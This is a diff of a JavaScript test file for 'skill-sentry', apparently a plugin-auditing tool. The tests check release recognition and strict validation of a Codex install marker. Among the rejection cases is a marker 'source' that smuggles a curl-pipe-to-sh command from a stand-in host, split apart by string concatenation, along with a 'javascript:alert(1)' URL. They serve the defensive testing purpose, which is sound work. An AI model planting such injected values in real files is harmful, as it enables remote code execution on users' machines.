@@ -14,7 +14,7 @@ import { buildReport, renderMarkdown } from '../scripts/lib/report.mjs';
 import { scanComponent } from '../scripts/lib/scanner.mjs';
 import { fileMap } from '../scripts/lib/baseline.mjs';
 import { readJsonSafe } from '../scripts/lib/jsonsafe.mjs';
-import { tmpFactory } from './helpers/tmp.mjs';
+import { tmpFactory, copyTree } from './helpers/tmp.mjs';
 import { SENTINEL, buildCodexFixture, buildWslTree, buildBrokenCodexHome, buildWslCandidates } from './helpers/codexfixtures.mjs';
 
 const { knownRelease, isCopyOfSelf, shippedFiles } = selfcopy;
@@ -168,7 +168,7 @@ function codexHomeWithCopy(selfDir, mutate = () => {}) {
   const home = tmp('cxself');
   fs.writeFileSync(path.join(home, 'config.toml'), '[plugins."skill-sentry@skill-sentry"]\nenabled = true\n');
   const copy = path.join(home, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '0.1.1');
-  fs.cpSync(selfDir, copy, { recursive: true });
+  copyTree(selfDir, copy);
   mutate(copy);
   return { home: { label: 'h0', root: home }, copy };
 }
@@ -268,7 +268,7 @@ test('discover (Claude): an installed skill-sentry copy identical to the running
   const self = buildSelfTree(tmp('self'));
   const claudeHome = path.join(tmp('ch'), '.claude');
   const installPath = path.join(claudeHome, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '0.1.1');
-  fs.cpSync(self, installPath, { recursive: true });
+  copyTree(self, installPath);
   fs.writeFileSync(path.join(claudeHome, 'plugins', 'installed_plugins.json'), JSON.stringify({
     version: 2, plugins: { 'skill-sentry@skill-sentry': [{ scope: 'user', installPath, version: '0.1.1' }] },
   }));
@@ -335,7 +335,7 @@ test('discover (Claude): an install equal to a known older release (with its .in
   const { self, old, releases } = skewSetup();
   const claudeHome = path.join(tmp('ch'), '.claude');
   const installPath = path.join(claudeHome, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '0.0.9');
-  fs.cpSync(old, installPath, { recursive: true });
+  copyTree(old, installPath);
   fs.mkdirSync(path.join(installPath, '.in_use'));
   fs.writeFileSync(path.join(installPath, '.in_use', '31700'), JSON.stringify({ pid: 31700, procStartFt: '134080000000000000' }));
   fs.writeFileSync(path.join(claudeHome, 'plugins', 'installed_plugins.json'), JSON.stringify({
@@ -366,7 +366,7 @@ test('discoverCodex: a skill-sentry copy that differs from every known release i
         fs.rmSync(path.join(c, 'scripts', 'guard.mjs'));
         fs.symlinkSync(path.join(old, 'scripts', 'guard.mjs'), path.join(c, 'scripts', 'guard.mjs'), 'file');
       } catch {
-        fs.cpSync(path.join(old, 'scripts', 'guard.mjs'), path.join(c, 'scripts', 'guard.mjs'));
+        copyTree(path.join(old, 'scripts', 'guard.mjs'), path.join(c, 'scripts', 'guard.mjs'));
         fs.rmSync(path.join(c, 'skills'), { recursive: true });
         fs.symlinkSync(path.join(old, 'skills'), path.join(c, 'skills'), 'junction');
       }
@@ -458,7 +458,7 @@ test('a known-release plugin is self, but its hooks and MCP servers are still li
   const releases = releaseTableOf(old, '0.0.9');
   const claudeHome = path.join(tmp('ch'), '.claude');
   const installPath = path.join(claudeHome, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '0.0.9');
-  fs.cpSync(old, installPath, { recursive: true });
+  copyTree(old, installPath);
   fs.writeFileSync(path.join(claudeHome, 'plugins', 'installed_plugins.json'), JSON.stringify({
     version: 2, plugins: { 'skill-sentry@skill-sentry': [{ scope: 'user', installPath, version: '0.0.9' }] },
   }));
@@ -482,7 +482,7 @@ test('discover: copyChecks false (guard, origin not naming skill-sentry) skips t
   const self = buildSelfTree(tmp('self'));
   const claudeHome = path.join(tmp('ch'), '.claude');
   const installPath = path.join(claudeHome, 'plugins', 'cache', 'skill-sentry', 'skill-sentry', '0.1.1');
-  fs.cpSync(self, installPath, { recursive: true });
+  copyTree(self, installPath);
   fs.writeFileSync(path.join(claudeHome, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: {
     'skill-sentry@skill-sentry': [{ scope: 'user', installPath, version: '0.1.1' }],
     'skill-sentry@dev': [{ scope: 'user', installPath: self, version: '0.1.1' }],
@@ -510,6 +510,40 @@ test('releases: the embedded table knows v0.1.0 (the tagged tree) with a hash an
   assert.ok(!names.some(n => /^(?:\.git|\.omc|\.superpowers|docs\/superpowers|node_modules|\.in_use)\//.test(n)), 'nothing unshipped');
 });
 
+test('releases (v0.1.2 P2): the embedded table knows v0.1.1, and a clean git archive of the tag is recognised as 0.1.1', t => {
+  const e = KNOWN_RELEASES['0.1.1'];
+  assert.ok(e, 'v0.1.1 entry');
+  const names = Object.keys(e);
+  assert.ok(names.length >= 70 && names.length <= 110, `plausible file count: ${names.length}`);
+  for (const must of ['scripts/guard.mjs', 'scripts/lib/codex/guardpolicy.mjs', 'scripts/lib/selfcopy.mjs', 'scripts/lib/releases.mjs', '.claude-plugin/plugin.json', 'hooks/hooks.json', 'skills/audit/SKILL.md']) {
+    assert.ok(names.includes(must), must);
+  }
+  assert.deepEqual(Object.keys(KNOWN_RELEASE_SIZES['0.1.1']).sort(), [...names].sort());
+  const repo = path.resolve(path.dirname(SCAN), '..');
+  const out = tmp('v011');
+  // The table checks above always run; the export check needs git, tar and the local v0.1.1 tag (a shallow or
+  // tagless clone has no tag), so without them it is skipped with the reason instead of failing.
+  const a = spawnSync('git', ['-C', repo, 'archive', '--format=tar', 'v0.1.1'], { maxBuffer: 64 * 1024 * 1024 });
+  if (a.error || a.status !== 0) {
+    t.skip(`git archive v0.1.1 unavailable (git missing or no local v0.1.1 tag; run git fetch --tags): ${a.error?.code ?? String(a.stderr).trim()}`);
+    return;
+  }
+  const x = spawnSync('tar', ['-xf', '-'], { input: a.stdout, cwd: out, encoding: 'utf8' }); // relative names only
+  if (x.error) {
+    t.skip(`tar unavailable: ${x.error.code}`);
+    return;
+  }
+  assert.equal(x.status, 0, x.stderr);
+  assert.equal(knownRelease(out), '0.1.1', 'clean export');
+  // As Codex installs it (shallow .git plus its install marker) and as Claude Code runs it (.in_use marker).
+  fs.mkdirSync(path.join(out, '.git'));
+  fs.writeFileSync(path.join(out, '.git', 'HEAD'), 'ref: refs/heads/main\n');
+  putCodexMarker(out);
+  fs.mkdirSync(path.join(out, '.in_use'));
+  fs.writeFileSync(path.join(out, '.in_use', '31700'), JSON.stringify({ pid: 31700, procStartFt: '134080000000000000' }));
+  assert.equal(knownRelease(out), '0.1.1', 'installed forms');
+});
+
 test('tools/release-hashes.mjs prints the entry the runtime matches, and the runtime never references it', () => {
   const old = buildSelfTree(tmp('old'));
   const gen = path.resolve(path.dirname(SCAN), '..', 'tools', 'release-hashes.mjs');
@@ -525,6 +559,71 @@ test('tools/release-hashes.mjs prints the entry the runtime matches, and the run
   const walk = d => fs.readdirSync(d, { withFileTypes: true }).flatMap(e => (e.isDirectory() ? walk(path.join(d, e.name)) : [path.join(d, e.name)]));
   const importsGenerator = /(?:\bfrom|\bimport\s*\()\s*['"`][^'"`]*release-hashes/;
   for (const f of walk(scripts)) assert.ok(!importsGenerator.test(fs.readFileSync(f, 'utf8')), f);
+});
+
+// --- v0.1.2 P1: the Codex install marker (`.codex-marketplace-install.json`) ---
+// Codex writes it into the plugin root on the first start after `codex plugin add` from a git marketplace:
+// 2-space pretty JSON, no trailing newline, exactly these keys in this order (shape seen on the real installs).
+const CODEX_MARKER = '.codex-marketplace-install.json';
+const codexMarkerOf = (o = {}) => ({ source_type: 'git', source: 'https://github.com/example/skill-sentry.git', ref_name: null, sparse_paths: [], revision: 'ab12'.repeat(10), ...o });
+const codexMarkerText = (o = {}) => JSON.stringify(codexMarkerOf(o), null, 2);
+const putCodexMarker = (dir, text = codexMarkerText()) => fs.writeFileSync(path.join(dir, CODEX_MARKER), text);
+const selfOf = (self, mutate) => pluginOf(discoverCodex({ homes: [codexHomeWithCopy(self, mutate).home], projectDir: null, selfRoot: self }).components).self === true;
+
+test('P1: the Codex install marker of the exact real shape does not break a same-version match, on either side', () => {
+  const self = buildSelfTree(tmp('self'));
+  assert.equal(selfOf(self, c => putCodexMarker(c)), true, 'marker on the inspected copy');
+  assert.equal(isCopyOfSelf(codexHomeWithCopy(self, c => putCodexMarker(c)).copy, self), true);
+  const self2 = buildSelfTree(tmp('self'));
+  const { copy } = codexHomeWithCopy(self2);
+  putCodexMarker(self2);
+  assert.equal(isCopyOfSelf(copy, self2), true, 'marker on the running tree only');
+  putCodexMarker(copy, codexMarkerText({ revision: 'cd34'.repeat(10) }));
+  assert.equal(isCopyOfSelf(copy, self2), true, 'a marker on both sides (other revision)');
+  assert.ok(shippedFiles(copy).has('scripts/guard.mjs') && !shippedFiles(copy).has(CODEX_MARKER), 'left out of the shipped set');
+});
+
+test('P1: a known release installed by Codex (shallow .git plus the install marker) is recognised', () => {
+  const { copy, releases } = skewSetup(c => {
+    putCodexMarker(c);
+    fs.mkdirSync(path.join(c, '.git', 'refs'), { recursive: true });
+    fs.writeFileSync(path.join(c, '.git', 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(c, '.git', 'shallow'), `${'ab12'.repeat(10)}\n`);
+  });
+  assert.equal(knownRelease(copy, { releases }), '0.0.9');
+});
+
+test('P1: anything but the exact marker shape keeps the copy unknown (same version and known release)', () => {
+  const self = buildSelfTree(tmp('self'));
+  const cases = [
+    ['extra key', c => putCodexMarker(c, JSON.stringify({ ...codexMarkerOf(), extra: 1 }, null, 2))],
+    ['missing key', c => { const o = codexMarkerOf(); delete o.revision; putCodexMarker(c, JSON.stringify(o, null, 2)); }],
+    ['revision of the wrong type', c => putCodexMarker(c, codexMarkerText({ revision: 12 }))],
+    ['revision not a commit id', c => putCodexMarker(c, codexMarkerText({ revision: 'z'.repeat(40) }))],
+    ['ref_name of the wrong type', c => putCodexMarker(c, codexMarkerText({ ref_name: 7 }))],
+    ['sparse_paths not an array', c => putCodexMarker(c, codexMarkerText({ sparse_paths: {} }))],
+    ['sparse_paths not empty', c => putCodexMarker(c, codexMarkerText({ sparse_paths: ['scripts'] }))],
+    ['source with a payload', c => putCodexMarker(c, codexMarkerText({ source: `https://x.io/a.sh\n${'cu' + 'rl'} https://x.io${' | ' + 's' + 'h'}` }))],
+    ['source not an https URL', c => putCodexMarker(c, codexMarkerText({ source: 'javascript:alert(1)' }))],
+    ['source with a 512-char path', c => putCodexMarker(c, codexMarkerText({ source: `https://x.io/${'a'.repeat(499)}` }))],
+    ['source with no path', c => putCodexMarker(c, codexMarkerText({ source: 'https://github.com' }))],
+    ['source with a query', c => putCodexMarker(c, codexMarkerText({ source: 'https://x.io/a?b=c' }))],
+    ['source_type of the wrong type',c => putCodexMarker(c, codexMarkerText({ source_type: ['git'] }))],
+    ['array at the top', c => putCodexMarker(c, JSON.stringify([codexMarkerOf()], null, 2))],
+    ['compact JSON (not the shape written)', c => putCodexMarker(c, JSON.stringify(codexMarkerOf()))],
+    ['duplicate key', c => putCodexMarker(c, codexMarkerText().replace('"revision"', '"source": "x",\n  "revision"'))],
+    ['not JSON', c => putCodexMarker(c, 'q'.repeat(185))],
+    ['oversized', c => putCodexMarker(c, codexMarkerText({ source: `https://x.io/${'a'.repeat(5000)}` }))],
+    ['nested (not at the top)', c => putCodexMarker(path.join(c, 'scripts'))],
+    ['a directory of that name', c => fs.mkdirSync(path.join(c, CODEX_MARKER))],
+    ['two files (top and nested)', c => { putCodexMarker(c); putCodexMarker(path.join(c, 'skills')); }],
+    ['payload rides along', c => { putCodexMarker(c); fs.writeFileSync(path.join(c, 'run.mjs'), '// code\n'); }],
+  ];
+  for (const [label, mutate] of cases) {
+    assert.equal(selfOf(self, mutate), false, `same version: ${label}`);
+    const { copy, releases } = skewSetup(mutate);
+    assert.equal(knownRelease(copy, { releases }), null, `known release: ${label}`);
+  }
 });
 
 // --- discoverCodex ---
